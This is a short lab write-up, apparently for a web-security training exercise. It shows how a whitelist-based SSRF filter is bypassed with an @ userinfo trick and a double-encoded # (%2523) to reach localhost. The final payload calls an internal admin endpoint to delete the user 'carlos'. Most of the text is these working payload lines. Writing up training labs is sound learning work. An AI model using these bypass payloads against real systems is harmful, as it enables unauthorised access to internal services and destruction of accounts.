SSRF with whitelist-based input filter

Start by checking the effects of adding @ to the querry:

stockApi=http://username@stock.weliketoshop.net/

A 500 error. Adding a # (as in /username#@stock.weliketoshop.net) gets us the same result.
Let's use our trusty double encoding for #:

stockApi=http://username%2523@stock.weliketoshop.net/

We get a different error:
"Could not connect to external stock check service"

Okay, so it attempts to connect to the username. Let's replace the username with localhost:

stockApi=http://localhost:80%2523@stock.weliketoshop.net

Cool, we got a 200. Now let's delete carlos:

stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

Wonderful.
